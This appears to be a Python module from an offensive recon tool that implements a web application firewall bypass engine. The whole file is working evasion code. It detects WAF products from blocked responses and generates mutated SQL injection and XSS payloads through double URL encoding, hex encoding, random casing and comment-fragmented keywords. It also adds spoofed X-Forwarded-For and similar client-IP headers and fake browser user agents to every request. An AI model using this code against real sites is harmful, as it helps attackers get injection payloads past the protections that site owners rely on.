"""
core/waf_bypass_engine.py - Advanced WAF Bypass with Polymorphic Payloads
Implements CONSTRAINT 2: WAF bypass strategy with polymorphic encodings and fake headers.
"""

import logging
import random
import base64
import urllib.parse
import string
import re
from typing import List, Dict, Optional, Tuple
from enum import Enum
from dataclasses import dataclass

logger = logging.getLogger("recon.waf_bypass_engine")


class BypassMode(Enum):
    """WAF bypass strategies."""
    NONE = "NONE"  # No bypass (baseline)
    ENCODE = "ENCODE"  # URL double encoding, hex encoding
    CASE_MANGLE = "CASE_MANGLE"  # Mixed case obfuscation
    FRAGMENT = "FRAGMENT"  # Break keywords with comments
    SLOW = "SLOW"  # Minimal payloads, slow rate
    POLYMORPHIC = "POLYMORPHIC"  # Combine multiple techniques


class WAFType(Enum):
    """Detected WAF types."""
    UNKNOWN = "unknown"
    MODSECURITY = "modsecurity"
    CLOUDFLARE = "cloudflare"
    WORDFENCE = "wordfence"
    F5 = "f5"
    IMPERVA = "imperva"
    AKAMAI = "akamai"
    AWS_WAF = "aws_waf"


@dataclass
class BypassAttempt:
    """Record of a bypass attempt."""
    bypass_mode: BypassMode
    payload: str
    headers: Dict[str, str]
    status_code: int
    response_length: int
    blocked: bool
    reason: Optional[str] = None


class WAFBypassEngine:
    """
    Advanced WAF bypass with polymorphic payload generation.
    
    Strategy:
    1. Detect 403/406 responses
    2. Identify WAF type by response patterns
    3. Apply targeted bypass techniques
    4. Rotate through bypass modes on failure
    5. Add evasion headers on every request
    """

    # WAF detection patterns
    WAF_SIGNATURES = {
        WAFType.CLOUDFLARE: [
            r'cf-ray',
            r'cloudflare',
            r'error code: 1020',
            r'error code: 1012',
        ],
        WAFType.MODSECURITY: [
            r'modsecurity',
            r'403 forbidden',
            r'access denied',
        ],
        WAFType.WORDFENCE: [
            r'wordfence',
            r'403 forbidden - accessed a forbidden resource',
        ],
        WAFType.F5: [
            r'f5',
            r'security policy',
        ],
        WAFType.AWS_WAF: [
            r'aws waf',
            r'wafv2',
        ],
    }

    # Real browser user agents
    BROWSER_USER_AGENTS = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15",
    ]

    def __init__(self):
        self.waf_type = WAFType.UNKNOWN
        self.bypass_attempts: List[BypassAttempt] = []
        self.consecutive_blocks = 0
        self.current_bypass_mode = BypassMode.NONE
        self.failed_patterns = []  # Track what encoding failed
        self.last_403_response = None

    def detect_waf_blocking(
        self,
        status_code: int,
        response_headers: Dict[str, str],
        response_body: str
    ) -> Tuple[bool, Optional[str]]:
        """
        Detect if response indicates WAF blocking.
        
        Returns: (is_blocked, reason)
        """
        response_body_lower = response_body.lower()
        
        # 403/406 are classic WAF response codes
        if status_code in [403, 406]:
            logger.warning(f"[WAF] Detected {status_code} response - WAF blocking likely")
            self.last_403_response = response_body
            self.consecutive_blocks += 1
            
            # Attempt WAF detection
            for waf_type, signatures in self.WAF_SIGNATURES.items():
                for sig in signatures:
                    if re.search(sig, response_body_lower) or any(
                        re.search(sig, v.lower()) for v in response_headers.values()
                    ):
                        logger.warning(f"[WAF] Detected WAF type: {waf_type.value}")
                        self.waf_type = waf_type
                        return True, f"{status_code} - {waf_type.value}"
            
            return True, f"{status_code} - Unknown WAF"
        
        # Other indicators
        if status_code == 429:  # Rate limiting
            logger.warning(f"[WAF] Rate limiting detected (429)")
            return True, "429 - Rate Limits"
        
        if status_code == 0 or status_code >= 500:  # Connection error or server error
            logger.warning(f"[WAF] Connection reset ({status_code})")
            return True, f"{status_code} - Connection Error"
        
        # Response body indicators
        if any(pattern in response_body_lower for pattern in ['blocked', 'forbidden', 'access denied', 'denied']):
            logger.debug(f"[WAF] Body contains blocking indicators")
            return True, "Blocking indicator in body"
        
        # Reset consecutive blocks on 200/OK
        if status_code == 200:
            self.consecutive_blocks = 0
        
        return False, None

    def recommend_bypass_mode(self) -> BypassMode:
        """
        Recommend next bypass mode based on consecutive blocks.
        
        Escalation strategy:
        0-3 blocks: NONE
        4-10 blocks: ENCODE
        11-20 blocks: CASE_MANGLE
        21-40 blocks: FRAGMENT
        41+: SLOW
        """
        if self.consecutive_blocks <= 3:
            return BypassMode.NONE
        elif self.consecutive_blocks <= 10:
            return BypassMode.ENCODE
        elif self.consecutive_blocks <= 20:
            return BypassMode.CASE_MANGLE
        elif self.consecutive_blocks <= 40:
            return BypassMode.FRAGMENT
        else:
            return BypassMode.SLOW

    def generate_polymorphic_payloads(
        self,
        base_payload: str,
        bypass_mode: BypassMode,
        count: int = 5
    ) -> List[str]:
        """
        Generate polymorphic variants of a payload using bypass mode.
        
        Each variant uses different encoding/obfuscation technique.
        Returns: List of payload variants
        
        CONSTRAINT: Max 5 variants to avoid explosion
        """
        variants = [base_payload]  # Always include original
        
        if bypass_mode == BypassMode.NONE:
            # No bypass - return original only
            return [base_payload]
        
        elif bypass_mode == BypassMode.ENCODE:
            variants.extend([
                self._url_encode_payload(base_payload),
                self._url_double_encode_payload(base_payload),
                self._hex_encode_payload(base_payload),
                self._mixed_encoding_payload(base_payload),
            ])
        
        elif bypass_mode == BypassMode.CASE_MANGLE:
            variants.extend([
                self._case_mangle_payload(base_payload),
                self._random_case_payload(base_payload),
                self._mixed_case_keywords(base_payload),
            ])
        
        elif bypass_mode == BypassMode.FRAGMENT:
            variants.extend([
                self._comment_fragment_payload(base_payload),
                self._char_fragment_payload(base_payload),
                self._unicode_fragment_payload(base_payload),
            ])
        
        elif bypass_mode == BypassMode.SLOW:
            # SLOW mode: minimal payloads only
            variants = [base_payload]
        
        elif bypass_mode == BypassMode.POLYMORPHIC:
            # POLYMORPHIC: combine all techniques
            variants.extend([
                self._url_encode_payload(base_payload),
                self._case_mangle_payload(base_payload),
                self._comment_fragment_payload(base_payload),
                self._hex_encode_payload(base_payload),
            ])
        
        # Remove duplicates and limit to count
        variants = list(dict.fromkeys(variants))[:count]
        logger.debug(f"[WAF-BYPASS] Generated {len(variants)} polymorphic variants using {bypass_mode.value}")
        return variants

    # ─── Encoding Techniques ──────────────────────────────────────────────────

    def _url_encode_payload(self, payload: str) -> str:
        """URL encode special characters only (keep alphanumeric)."""
        # Encode < > " ' ; ( ) and whitespace
        special_chars = '<>"\';()= \n\t'
        encoded = ''.join(
            urllib.parse.quote(c) if c in special_chars else c
            for c in payload
        )
        return encoded

    def _url_double_encode_payload(self, payload: str) -> str:
        """Double URL encode - encodes already-encoded payload."""
        first_pass = self._url_encode_payload(payload)
        second_pass = urllib.parse.quote(first_pass)
        return second_pass

    def _hex_encode_payload(self, payload: str) -> str:
        """Convert to hex representation."""
        try:
            # For SQL/RCE: use 0x prefix
            if 'SELECT' in payload.upper() or 'UNION' in payload.upper():
                # SQL: encode individual characters as 0xHH
                hex_bytes = ''.join(f'0x{ord(c):02x}' if not c.isalnum() else c for c in payload)
                return hex_bytes
            else:
                # Other: full hex encoding
                return '0x' + payload.encode().hex()
        except Exception as e:
            logger.debug(f"[WAF-BYPASS] Hex encoding failed: {e}")
            return payload

    def _mixed_encoding_payload(self, payload: str) -> str:
        """Mix URL encoding with other techniques."""
        # Encode half the special chars, leave others
        result = []
        for c in payload:
            if c in '<>"\'':
                if random.choice([True, False]):
                    result.append(urllib.parse.quote(c))
                else:
                    result.append(c)
            else:
                result.append(c)
        return ''.join(result)

    # ─── Case Mangling Techniques ─────────────────────────────────────────────

    def _case_mangle_payload(self, payload: str) -> str:
        """Alternate case: aBcDeF pattern."""
        result = []
        for i, c in enumerate(payload):
            if c.isalpha():
                result.append(c.upper() if i % 2 == 0 else c.lower())
            else:
                result.append(c)
        return ''.join(result)

    def _random_case_payload(self, payload: str) -> str:
        """Random case for each letter."""
        result = []
        for c in payload:
            if c.isalpha():
                result.append(c.upper() if random.choice([True, False]) else c.lower())
            else:
                result.append(c)
        return ''.join(result)

    def _mixed_case_keywords(self, payload: str) -> str:
        """Mix case for keywords (UNION, SELECT, etc)."""
        keywords = ['UNION', 'SELECT', 'AND', 'OR', 'WHERE', 'FROM', 'SCRIPT', 'ALERT', 'EVAL']
        result = payload
        for kw in keywords:
            # Create mixed case variant
            mixed = ''.join(
                c.upper() if random.choice([True, False]) else c.lower()
                for c in kw
            )
            result = re.sub(kw, mixed, result, flags=re.IGNORECASE)
        return result

    # ─── Fragment Techniques ──────────────────────────────────────────────────

    def _comment_fragment_payload(self, payload: str) -> str:
        """Break keywords with comments: UN/**/ION, SEL/**/ECT."""
        keywords = ['UNION', 'SELECT', 'AND', 'OR', 'WHERE', 'FROM', 'SCRIPT', 'ALERT', 'EVAL']
        result = payload
        for kw in keywords:
            # Split keyword at middle with comment
            if len(kw) > 2:
                mid = len(kw) // 2
                fragment = f"{kw[:mid]}/*{random.randint(1,999)}_x*/{kw[mid:]}"
                result = re.sub(kw, fragment, result, flags=re.IGNORECASE)
        
        return result

    def _char_fragment_payload(self, payload: str) -> str:
        """Fragment payload with concats: 'UN'+'ION' (language-specific)."""
        # For SQL: string concatenation
        if 'SELECT' in payload.upper() or 'UNION' in payload.upper():
            # Basic attempt: add quotes around keywords
            result = re.sub('UNION', "'UN'+'ION'", payload, flags=re.IGNORECASE)
            result = re.sub('SELECT', "'SEL'+'ECT'", result, flags=re.IGNORECASE)
            return result
        return payload

    def _unicode_fragment_payload(self, payload: str) -> str:
        """Use unicode escapes: \\u0041 for 'A'."""
        try:
            # Escape a few characters as unicode
            result = []
            for i, c in enumerate(payload):
                if c.isalpha() and random.random() < 0.3:  # 30% unicode escape
                    result.append(f"\\u{ord(c):04x}")
                else:
                    result.append(c)
            return ''.join(result)
        except Exception as e:
            logger.debug(f"[WAF-BYPASS] Unicode fragmentation failed: {e}")
            return payload

    # ─── Header Evasion ──────────────────────────────────────────────────────

    def generate_evasion_headers(self) -> Dict[str, str]:
        """
        Generate evasion headers to bypass WAF detection.
        
        CONSTRAINT: Add fake headers to every request
        X-Forwarded-For: [Random_IP]
        X-Real-IP: [Random_IP]
        User-Agent: [Real_Browser_String]
        """
        random_ip = ".".join(str(random.randint(0, 255)) for _ in range(4))
        
        headers = {
            'User-Agent': random.choice(self.BROWSER_USER_AGENTS),
            'X-Forwarded-For': random_ip,
            'X-Real-IP': random_ip,
            'X-Originating-IP': f"[ {random_ip} ]",
            'X-Forwarded-Host': f"localhost",
            'X-Client-IP': random_ip,
            'CF-Connecting-IP': random_ip,
            'True-Client-IP': random_ip,
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate',
            'DNT': '1',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
        }
        
        return headers

    def record_attempt(
        self,
        bypass_mode: BypassMode,
        payload: str,
        status_code: int,
        response_length: int,
        blocked: bool,
        reason: Optional[str] = None
    ):
        """Record a bypass attempt for later analysis."""
        headers = self.generate_evasion_headers()
        attempt = BypassAttempt(
            bypass_mode=bypass_mode,
            payload=payload[:100],  # Truncate for storage
            headers={k: v[:50] for k, v in headers.items()},  # Truncate header values
            status_code=status_code,
            response_length=response_length,
            blocked=blocked,
            reason=reason
        )
        self.bypass_attempts.append(attempt)
        
        if len(self.bypass_attempts) > 100:
            self.bypass_attempts = self.bypass_attempts[-100:]  # Keep last 100

    def get_bypass_statistics(self) -> Dict:
        """Get statistics on bypass effectiveness."""
        if not self.bypass_attempts:
            return {'attempts': 0}
        
        stats = {
            'attempts': len(self.bypass_attempts),
            'success_rate': sum(1 for a in self.bypass_attempts if not a.blocked) / len(self.bypass_attempts),
        }
        
        # Count by mode
        by_mode = {}
        for attempt in self.bypass_attempts:
            mode = attempt.bypass_mode.value
            if mode not in by_mode:
                by_mode[mode] = {'total': 0, 'blocked': 0}
            by_mode[mode]['total'] += 1
            if attempt.blocked:
                by_mode[mode]['blocked'] += 1
        
        stats['by_mode'] = {
            mode: {
                'total': data['total'],
                'blocked': data['blocked'],
                'success_rate': (data['total'] - data['blocked']) / data['total'] if data['total'] > 0 else 0
            }
            for mode, data in by_mode.items()
        }
        
        return stats

    def should_escalate_bypass(self) -> bool:
        """
        Determine if we should escalate to next bypass mode.
        
        CONSTRAINT: If 403/406 > 10 times in a row → escalate
        """
        return self.consecutive_blocks > 10 and self.current_bypass_mode != BypassMode.SLOW
